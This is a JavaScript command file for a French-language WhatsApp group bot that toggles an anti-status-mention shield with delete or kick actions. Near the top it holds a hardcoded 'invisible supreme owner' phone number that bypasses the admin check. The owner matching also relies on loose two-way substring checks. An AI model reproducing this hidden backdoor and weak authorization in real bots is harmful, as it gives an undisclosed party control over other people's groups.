/**
 * Anti-Status Mention Command - Toggle antistatusmention protection with delete/kick options
 */

const database = require('../../database');
const config = require('../../config.js');

// Fonction pour le style Small Caps
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
  
  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'antistatusmention',
  aliases: ['asm', 'antitagstatus', 'antistatus'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: 'Configure la protection contre les mentions invisibles de statut (delete/kick)',
  usage: '.antistatusmention <on/off/set/get>',
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,

  async execute(sock, msg, args, extra) { 
    const prefix = config.prefix || '.';
    try { 
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
      const supremeOwner = '22651622652';
      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
      
      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
      if (!isMe) {
        const isAdmins = extra.isAdmins || false; // Dépend de ce que ton handler transmet dans 'extra'
        if (!isAdmins) {
          return extra.reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
        }
      }

      if (!args[0]) {
        const settings = database.getGroupSettings(extra.from);
        const status = settings.antistatusmention ? 'ON' : 'OFF';
        const action = (settings.antistatusmentionAction || 'delete').toUpperCase();
        
        return extra.reply(
          `╭╼━≪• *sᴛᴀᴛᴜᴛ ʙᴏᴜᴄʟɪᴇʀ_sᴛᴀᴛᴜᴛs* •≫━╾╮\n` +
          `┃\n` +
          `┃ 🛡️ *${toSmallCaps('etat')} :* ${status}\n` +
          `┃ ⚖️ *${toSmallCaps('sentence')} :* ${action}\n` +
          `┃\n` +
          `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
          `🔮 *${toSmallCaps('incantations disponibles')} :*\n` +
          `*${toSmallCaps('cet arcane detecte et purge les mentions')}*\n` +
          `*${toSmallCaps('cachees de statut dans le sanctuaire')}.*\n\n` +
          `  ${prefix}antistatusmention on\n` +
          `  ${prefix}antistatusmention off\n` +
          `  ${prefix}antistatusmention set delete | kick\n` +
          `  ${prefix}antistatusmention get\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
        );
      }
      
      const opt = args[0].toLowerCase();
      
      if (opt === 'on') {
        if (database.getGroupSettings(extra.from).antistatusmention) {
          return extra.reply(`*❌ ${toSmallCaps('le bouclier de statut est deja actif')} !*`);
        }
        database.updateGroupSettings(extra.from, { antistatusmention: true });
        return extra.reply(`*🛡️ ${toSmallCaps('bouclier de statut a ete eveille')} (ᴏɴ).*`);
      }
      
      if (opt === 'off') {
        database.updateGroupSettings(extra.from, { antistatusmention: false });
        return extra.reply(`*🔓 ${toSmallCaps('le bouclier de statut a ete desactive')} (ᴏғғ).*`);
      }
      
      if (opt === 'set') {
        if (args.length < 2) {
          return extra.reply(`*❓ ${toSmallCaps('veuillez specifier une sentence')} :* \`${prefix}antistatusmention set delete | kick\``);
        }
        
        const setAction = args[1].toLowerCase();
        if (!['delete', 'kick'].includes(setAction)) {
          return extra.reply(`*❓ ${toSmallCaps('sentence invalide. choisissez entre delete ou kick')}.*`);
        }
        
        database.updateGroupSettings(extra.from, { 
          antistatusmentionAction: setAction,
          antistatusmention: true // Auto-active lors de la configuration de l'action
        });
        return extra.reply(`*⚖️ ${toSmallCaps('la sentence du bouclier de statut est placee sur')} : ${setAction.toUpperCase()}*`);
      }
      
      if (opt === 'get') {
        const settings = database.getGroupSettings(extra.from);
        const status = settings.antistatusmention ? 'ON' : 'OFF';
        const action = (settings.antistatusmentionAction || 'delete').toUpperCase();
        
        return extra.reply(
          `╭╼━≪• *sᴛᴀᴛᴜᴛ ʙᴏᴜᴄʟɪᴇʀ_sᴛᴀᴛᴜᴛs* •≫━╾╮\n` +
          `┃\n` +
          `┃ 🛡️ *${toSmallCaps('etat')} :* ${status}\n` +
          `┃ ⚖️ *${toSmallCaps('sentence')} :* ${action}\n` +
          `┃\n` +
          `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
        );
      }
      
      return extra.reply(`*💡 ${toSmallCaps('utilise')} \`${prefix}antistatusmention\` ${toSmallCaps('pour voir les options')}.*`);
      
    } catch (error) {
      console.error('Anti-status mention command error:', error);
      await extra.reply(`❌ *ᴇʀʀᴇᴜʀ :* ${error.message}`);
    }
  }
};
